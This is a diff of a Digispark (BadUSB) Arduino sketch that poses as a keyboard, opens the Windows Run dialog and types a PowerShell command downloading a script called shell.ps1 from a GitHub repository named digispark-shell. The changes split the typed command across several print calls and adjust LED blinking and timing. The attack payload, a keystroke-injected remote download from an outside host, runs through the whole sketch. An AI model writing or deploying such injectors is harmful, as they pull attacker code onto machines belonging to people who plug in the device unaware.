@@ -3,18 +3,21 @@
 void setup()
 {
     pinMode(1, OUTPUT);
+    DigiKeyboardPtBr.sendKeyStroke(0);
+
     ledBlink(5);
 
-    DigiKeyboardPtBr.delay(300);
     DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
     ledBlink(8);
 
-    DigiKeyboardPtBr.println("powershell (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Louie-Cipher/digispark-shell/master/shell.ps1')");
+    DigiKeyboardPtBr.print("powershell (New-Object Net.WebClient).DownloadString('");
+    DigiKeyboardPtBr.print("https://raw.githubusercontent.com/Louie-Cipher/digispark-shell/master/shell.ps1");
+    DigiKeyboardPtBr.println("')");
 }
 
 void loop()
 {
-    ledBlink(10);
+    ledBlink(1);
 }
 
 void ledBlink(int times)
